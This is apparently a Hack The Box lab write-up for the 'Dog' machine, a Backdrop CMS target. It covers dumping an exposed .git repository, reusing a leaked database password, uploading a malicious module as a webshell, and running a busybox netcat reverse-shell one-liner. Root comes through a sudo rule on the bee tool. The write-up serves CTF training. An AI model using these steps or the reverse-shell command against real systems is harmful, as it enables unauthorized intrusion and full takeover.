Tags: #Linux/Ubuntu #Easy #Apache #Sensitive-Data-Exposure #Git #Outdated-software #Sudo-Misconfiguration 
# **Nmap Results**

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-29 16:07 EDT
Nmap scan report for 10.10.11.58
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
```
<br>
<br>

# **Service Enumeration**
Nmap discovered SSH running on port 22 and an Apache webserver on port 80. This time though, the scan reveals more valuable info than usual. It tells us the contents of robots.txt and that it found a git repository at /.git. Before we go there, let's head to the root directory of the website first:

![[Pasted image 20250330151724.png]]

On the top right, there's a button that leads to a Login page:

![[Pasted image 20250330151754.png]]

I've tried SQL Injection, but it doesn't work here. Nmap did find a git repository at **/.git** though. Maybe we'll find the credentials there. Let's take a look: 

![[Pasted image 20250329163202.png]]

The best thing to do here is download all of these files and reconstruct the repository on our system so we can use `git` on our command line to discover as much info as possible. To do this, we'll run the following command:

`wget -r -np http://10.10.11.58/.git/`  

This recursively downloads all files and folders while ignoring parent directories above **/.git**. 

The following `git` commands will build our repository:

```bash
git init
git remote add origin http://10.10.11.58/.git
git pull origin main
```

>[!tip]
>There's a tool on GitHub called [git-dumper](https://github.com/arthaud/git-dumper) that automates this whole process of downloading the files of an exposed git repository and reconstructing it on your local machine. However, knowing how to do this manually is good practice, as it proves your understanding of Git, an essential piece of knowledge for CTFs and hacking in general. 

After the repository has been created, we have to start looking through what we have to see what sort of info we can find. 

In **settings.php**, there are credentials for a MySQL database in the line: `$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`.

Since the DB is hosted on localhost, we'll have to get user first before we can access it. However passwords are usually reused across different accounts, so this could help us

Assuming that's the password, we need to find an email address. We could either inspect each and every file, or we can use `grep` and a **regular expression** to recursively search through the content of all files and filter out ones that match the basic format of an email address. I like that idea better. Our command should look something like this:

`grep -rE ".+@.+\.htb" 2>/dev/null`

>[!info] Command explanation
>1. `-rE` - the r flag specifies a "recursive" search, meaning look through all files within each subdirectory. The E flag allows the use of Extended Regular Expressions (ERE), giving us more control and flexibility over the regex's we type.
>2. `".+@.+\.htb"` - This regex matches at least 1 or more characters of any sort, the "@" symbol, at least 1 or more characters, and ending with ".htb". 
>3. `2>/dev/null` - Redirects stderr to /dev/null, a special file that discard all data written to it. 

Here's the output:

![[Pasted image 20250330165817.png]]

We found Tiffany's email in the update.settings.json file. I tried logging in as her using the MySQL password I found above, and it seemed to have worked.

![[Pasted image 20250330170125.png]]
<br>
<br>
# **Exploitation**
## **Initial Access**
If we go over to **Reports > Status Report**, it tells us that the backdrop CMS version in use is **1.27.1**. I'm going to try and find a CVE on Google. The search returns an **Authenticated RCE** POC on [Exploit-DB](https://www.exploit-db.com/exploits/52021). 

>[!info] Exploit breakdown and vulnerability explanation
>The root of the vulnerability is how backdrop allows authenticated users with specific permissions/roles (like admin) to manually install modules via a .tar file upload or other accepted archive formats. It **does not** perform any sanitization or checks for malicious code, it **trusts** that because an admin installed it, it's valid.
>
> The exploit creates a module that follows the required structure (shell.info and shell.php files in this case), zips it, and uploads it. Once the attacker accesses the module in their browser, the PHP code immediately gets executed on the server-side, giving them a webshell. 

Let's use `searchsploit` to find that specific exploit and copy it to our working directory:

![[Pasted image 20250330181848.png]]

The only argument required is the URL. After the script is done executing, we're given a link to the malicious module's PHP site, but when we go there, it doesn't seem to exist. This is because uploaded modules have to be in certain archive formats:

![[Pasted image 20250330190335.png]]

Luckily, the script generated the malicious files, not just an archive of them, so we can just run `tar cf shell.tar shell` to create the correct archive, and then upload it. After doing so, we're presented with a message saying that the installation was successful:

![[Pasted image 20250330190620.png]]

Now we go to /modules/shell/shell.php and we get our webshell:

![[Pasted image 20250330190904.png]]

Lastly, we set up our listener with `nc -lvnp <port>` and execute a reverse shell payload on the webshell like `busybox nc <ip address> <port> -e sh`:

![[Pasted image 20250330191348.png]]

Great, we're now logged in as www-data. 

Earlier we found MySQL creds for the root user, but it turned out to be a rabbit hole, as there was nothing of use stored there. 

Here's what we see in the **/etc/passwd** file, filtering for users that have a login shell:

![[Pasted image 20250330213633.png]]
Two users, jobert and johncusack. We can try reusing root's mysql credentials for these users and log in through SSH. They ended up working for johncusack:

![[Pasted image 20250330213800.png]]

Now on to root!

<br>
<br>
# **Privilege Escalation**  
`sudo -l` outputs the following:

```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

`bee` is the command line tool for **Backdrop CMS**. Looking through the help menu, there is one argument of interest:

![[Pasted image 20250330221831.png]]

Given we have sudo privileges over `bee`, we can execute PHP code as root. So our payload is as simple as `sudo /usr/local/bin/bee eval 'system("bash");'`. However, you have to be in a directory where there's a Backdrop installation for this command to execute. 

So we'll `cd` over to **/var/www/html** and then execute our command.:

![[Pasted image 20250330222859.png]]

Dog has now been rooted. 
<br>
<br>
# Skills Learned
* Make use of bash's versatility and regular expressions to find what you want quickly instead of having to manually scroll through all files. For example, emails have a consistent syntax: some combination of characters followed by an "@" symbol and then .htb (in the case of HTB machines). You can use `grep` with the `-r` flag to recursively search through everything in the current working directory.
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/651